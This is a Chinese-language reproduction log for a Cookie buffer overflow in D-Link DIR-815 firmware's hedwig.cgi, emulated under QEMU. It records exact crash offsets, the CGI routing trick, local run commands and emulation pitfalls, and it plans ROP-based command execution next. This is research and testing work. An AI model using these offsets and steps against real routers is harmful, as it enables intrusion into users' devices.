# 复现记录：DIR-815 Rev B1 / V2.02b01

环境：Ubuntu 24.04 (WSL2) / QEMU user 8.2.2 / 二进制 `htdocs/cgibin`
（MIPS32 little-endian，uClibc 0.9.30.1，stripped）。

## 1. 结论

**`/hedwig.cgi` 的 Cookie 溢出在本固件中真实存在，已复现。**

定义 **N = `uid=` 之后攻击者可控的字节数**（Cookie 整串长度 = N + 4）。

| N | Cookie 整串 | 结果 |
|---|---|---|
| 32 – 1035 | 36 – 1039 | 正常返回（`HTTP/1.1 200 OK` + XML，cgibin rc=255） |
| **1036** | **1040** | **SIGBUS**（rc=135） |
| **1037** | **1041** | **SIGILL**（rc=132） |
| **1038 – 2048+** | **1042 – 2052+** | **SIGSEGV**（rc=139） |

逐字节扫描（n 为 A 的个数，cookie 长度 = n + 4）：

```text
n=1035  cookie=1039  rc=255  正常
n=1036  cookie=1040  rc=135  SIGBUS   <- 首次异常
n=1037  cookie=1041  rc=132  SIGILL
n=1038  cookie=1042  rc=139  SIGSEGV  <- 首次 SIGSEGV,此后稳定
```

**三种信号依次出现，是返回地址被逐字节覆盖的典型表现**：写坏低字节 → 跳到
非法地址（BUS/ILL），写满 → 彻底段错误。缓冲区边界在 N≈1036，
可以直接在此基础上定位 `$ra` 的偏移。

> ⚠️ 踩过的坑：第一版扫描只把 SIGSEGV 算作崩溃，于是 SIGBUS/SIGILL
> 被误判成"正常"，阈值被报大了 6 字节。**统计崩溃必须看 `rc >= 128`
> （任意致命信号），不能只认 139。**

## 2. 关键发现

### 2.1 `hedwig.cgi` 不是文件

`find squashfs-root -name '*.cgi'` 结果为空。所有 CGI 都是由
`htdocs/cgibin` **按 URL 分发**的虚拟入口，分发依据是 `REQUEST_URI`：

```text
dlapn.cgi  dldongle.cgi  dlcfg.cgi  seama.cgi  fwup.cgi  session.cgi
captcha.cgi  hedwig.cgi  pigwidgeon.cgi  service.cgi  soap.cgi  gena.cgi
conntrack.cgi
```

`cgibin` 里同时存在 `hedwigcgi_main`、`hnap_main` 等 handler 符号字符串。

因此本地复现必须伪造两个东西：

1. `argv[0]` → `qemu -0 /hedwig.cgi`
2. `REQUEST_URI` → `-E REQUEST_URI=/hedwig.cgi`

缺任何一个都会落到别的 handler（`session.cgi` 在同样的参数下直接无输出退出）。

### 2.2 正常的响应长什么样

```http
HTTP/1.1 200 OK
Content-Type: text/xml

<hedwig><result>FAILED</result><message>no xml data.</message></hedwig>
```

请求里没有 XML body 时就是这个结果。它的存在证明**已经进入 `hedwigcgi_main`**，
这是判断"路由正确"的锚点。

## 3. 复现命令

```bash
# 1. 解包(注意用 tar,见第 4 节)
tar -xf DIR815_revB_FW_V2.02b01.bin_extracted_*.tar -C ~/work/dir815

# 2. 跑(会自动下载静态 qemu,不需要 docker / sudo)
cd D-Link/DIR-815
ROOTFS=~/work/dir815/squashfs-root ./tools/run-local.sh

# 3. 只看不崩的边界(N=1035,cookie 1039 字节)
ROOTFS=~/work/dir815/squashfs-root LEN=1035 ./tools/run-local.sh
```

预期输出：

```text
[*] qemu: qemu-mipsel version 8.2.2 ...
[*] entry=/hedwig.cgi  uid=<1038 字节>  cookie=<1042 字节>
qemu: uncaught target signal 11 (Segmentation fault) - core dumped
[!] rc=139 SIGSEGV —— 溢出已触发
```

## 4. 两个环境坑（都会让你卡很久）

### 4.1 Windows 上 7z 解包会丢掉全部 156 个软链接

用 7-Zip 在 Windows 解 squashfs 的结果里 `find -type l` 是 **0** 个，
而正确结果应该是 156 个。丢失的包括：

- `lib/ld-uClibc.so.0`（动态链接器，缺了所有程序都跑不起来）
- `lib/libc.so.0`
- `/usr/bin/*` 指向 busybox 的一堆 applet

现象是 qemu 报 `No such file or directory`——看起来像文件不存在，
实际上是解释器路径解析不到。

**对策**：在 Linux 里解包（`tar` 或 `unsquashfs`），或者至少把
`ld-uClibc.so.0 → ld-uClibc-0.9.30.1.so`、`libc.so.0 → libuClibc-0.9.30.1.so`
手工补上。

### 4.2 设备节点解不出来是**正常的**

```
tar: ./squashfs-root/dev/null: Cannot mknod: Operation not permitted
```

非 root 解包时 `/dev/` 下的字符设备建不了，这不影响 qemu-user 运行
`cgibin`——它不依赖这些节点。

## 5. 后续

- [ ] 用 `gdb-multiarch` + `qemu -g 6666` 确认崩溃点确实是
      `hedwigcgi_main` 的栈帧，并测出到 `$ra` 的精确偏移
- [ ] 找可用的 ROP gadget（cgibin 里 `system`/`execve` 的调用点）
- [ ] 把 PoC 从"打崩"升级为"命令执行"，用带外 DNS 验证
